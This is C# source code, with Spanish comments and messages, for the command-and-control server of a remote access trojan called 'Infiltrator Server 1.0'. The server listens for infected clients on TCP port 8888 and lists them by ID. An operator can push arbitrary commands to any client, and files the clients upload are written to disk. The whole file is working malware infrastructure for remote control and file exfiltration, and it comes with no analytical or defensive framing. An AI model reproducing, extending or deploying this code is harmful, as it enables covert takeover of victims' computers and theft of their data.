using Server.Crypto;
using Server.GUI;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Server
{
    class ServidorRAT
    {
        private static TcpListener listener;
        private static Dictionary<int, TcpClient> clients = new Dictionary<int, TcpClient>();
        private static int clientIdCounter = 0;
        private static bool isRunning;
        private static bool waitingForResponse = false;
        static void Main(string[] args)
        {
            listener = new TcpListener(IPAddress.Any, 8888);
            listener.Start();
           

            Thread acceptClientsThread = new Thread(AcceptClients);
            acceptClientsThread.Start();
            isRunning = true;
            Menu.showMenu();
            while (isRunning)
            {
                if (!waitingForResponse) // Solo muestra el prompt si no se está esperando una respuesta
                {
                    Console.Write("\nInfiltrator Server 1.0>");
                }
                string input = Console.ReadLine();
                string[] parts = input.Split(new char[] { ' ' }, 2);
                if (parts.Length < 2)
                {
                    if (input.Trim().ToLower() == "help")
                    {
                        Menu.ShowHelp();
                    }
                    else if (input.Trim().ToLower() == "list_clients")
                    {
                        ListClients();
                    }else if (input.Trim().ToLower() == "exit")
                    {
                        listener.Stop();
                        isRunning = false;
                        Console.WriteLine("\nInfiltrator Server 1.0> [INFO] Deteniendo el servidor...");
                        break;
                    }
                    else
                    {
                        Console.WriteLine("\nInfiltrator Server 1.0> [ERROR] Formato incorrecto. Usa: ID comando");
                    }
                    continue;
                }

                if (int.TryParse(parts[0], out int clientId))
                {
                    
                    string command = parts[1];
                    SendCommand(clientId, command);
                    waitingForResponse = true;

                }
                else
                {
                    Console.WriteLine("\nInfiltrator Server 1.0> [ERROR] No hay ningún cliente conectado con ese ID.");
                }
                
            }
        }

        private static void AcceptClients()
        {
            try
            {
                while (isRunning)
                {
                    TcpClient client = listener.AcceptTcpClient();
                    clientIdCounter++;
                    int clientId = clientIdCounter;

                    lock (clients)
                    {
                        clients.Add(clientId, client);
                    }

                    Console.WriteLine($"\nInfiltrator Server 1.0> [INFO] Cliente {clientId} conectado.");
                    Thread clientThread = new Thread(() => HandleClient(client, clientId));
                    clientThread.Start();
                }
            }
            catch (SocketException)
            {
                // Se produce cuando listener.Stop() es llamado
                Console.WriteLine("\nInfiltrator Server 1.0> [INFO] El servidor ha sido detenido.");
            }
        }

        private static void HandleClient(TcpClient client, int clientId)
        {
            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[4096];
            int bytesRead;

            try
            {
                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) != 0)
                {
                    string data = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"\nInfiltrator Server 1.0> [Cliente {clientId}]: {data}");

                    // Verificar si se recibió un archivo
                    if (data.StartsWith("FILE:"))
                    {
                        string fileName = data.Substring(5).Trim();

                        // Recibir datos del archivo
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bool fileEndReceived = false;
                            while (!fileEndReceived)
                            {
                                bytesRead = stream.Read(buffer, 0, buffer.Length);
                                if (bytesRead == 0)
                                {
                                    // Conexión cerrada
                                    break;
                                }

                                // Verificar si se recibió el mensaje de fin de archivo
                                string chunkAsString = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                                if (chunkAsString.Contains("FILE_END"))
                                {
                                    fileEndReceived = true;
                                    int endIndex = chunkAsString.IndexOf("FILE_END");
                                    ms.Write(buffer, 0, endIndex);
                                }
                                else
                                {
                                    ms.Write(buffer, 0, bytesRead);
                                }
                            }

                            SaveFile(fileName, ms.ToArray());
                        }
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine($"\nInfiltrator Server 1.0>[ERROR] Error al manejar al cliente {clientId}: {ex.Message}");
            }

            lock (clients)
            {
                clients.Remove(clientId);
            }

            client.Close();
            Console.WriteLine($"\nInfiltrator Server 1.0> [INFO] Cliente {clientId} desconectado.");
        }
        private static void ListClients()
        {
            Console.WriteLine("\n=====================");
            Console.WriteLine("|CLIENTES CONECTADOS|");
            Console.WriteLine("=====================");
            lock (clients)
            {
                if (clients.Count == 0)
                {
                    Console.WriteLine("No hay clientes conectados.");
                }
                else
                {
                    Console.WriteLine("+--------------------------------------+");
                    Console.WriteLine("|       ID       |       Estado        |");
                    Console.WriteLine("+--------------------------------------+");
                    foreach (var client in clients)
                    {
                        string clientStatus = IsClientConnected(client.Value) ? "Conectado" : "Desconectado";
                        Console.WriteLine($"|        {client.Key,-5}   |      {clientStatus,-12}   |");
                    }
                    Console.WriteLine("+--------------------------------------+");
                }
            }

          
        }

        private static bool IsClientConnected(TcpClient client)
        {
            try
            {
                if (client != null && client.Client != null && client.Client.Connected)
                {
                    // Make a non-blocking call to see if the client is still connected
                    bool part1 = client.Client.Poll(1000, SelectMode.SelectRead);
                    bool part2 = (client.Client.Available == 0);
                    if (part1 && part2)
                        return false;
                    else
                        return true;
                }
                else
                    return false;
            }
            catch
            {
                return false;
            }
        }

        private static void SaveFile(string fileName, byte[] fileData)
        {
            try
            {
                File.WriteAllBytes(fileName, fileData);
                Console.WriteLine($"\nInfiltrator Server 1.0> [INFO] Archivo '{fileName}' recibido y guardado correctamente.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\nInfiltrator Server 1.0> [ERROR] Error al guardar el archivo '{fileName}': {ex.Message}");
            }
        }

        public static void SendCommand(int clientId, string command)
        {
            lock (clients)
            {
                if (clients.TryGetValue(clientId, out TcpClient client))
                {
                    NetworkStream stream = client.GetStream();
                    byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                    stream.Write(commandBytes, 0, commandBytes.Length);
                }
                else
                {
                    Console.WriteLine($"\nInfiltrator Server 1.0> [!] Cliente {clientId} no encontrado.");
                }
            }

        }


    }
}
